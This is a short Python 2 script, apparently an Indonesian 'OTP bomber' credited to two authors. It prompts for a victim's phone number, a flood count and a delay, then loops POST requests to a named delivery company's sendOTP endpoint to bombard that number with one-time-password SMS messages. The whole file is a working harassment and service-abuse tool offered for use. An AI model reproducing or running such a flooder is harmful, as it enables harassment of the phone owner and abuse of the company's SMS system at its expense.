import requests
import json
import sys
import time
import os
reload(sys)
sys.setdefaultencoding('utf8')
def boom(n, j, s):
    bom = 0
    url = "https://www.phd.co.id/en/users/sendOTP"
    data = {"phone_number":n}
    header= {'Content-Type':'application/x-www-form-urlencoded; charset=utf-8',
             'X-Requested-With':'XMLHttpRequest'
             }
    while bom < jml:
        bom += 1
        print "Hitung: ", bom
        print "kirim ke: ", n
        m = requests.post(url, data=data, headers= header)
        print 
        try:
            if json.loads(m.text).values()[0] != u'OK':
                print "FAILED"
            else:
                print "SUKSES"
        except:
            print "Error"
        time.sleep(sleep)
if __name__ == "__main__":
    os.system("clear")
    print """BOM PHD Made by Handika Pratama\r\nPython Recode : Qiuby Zhukhi\r\nNB: 
    BOM HANYA DIGUNAKAN 3x PERNOMOR\n
    """
    print "Nomor Hp 62xxx"
    no = raw_input("NOMOR HP: ")
    jml = int(raw_input("Jumlah Flood :"))
    sleep = int(raw_input("Timout: "))
    boom(no, jml, sleep)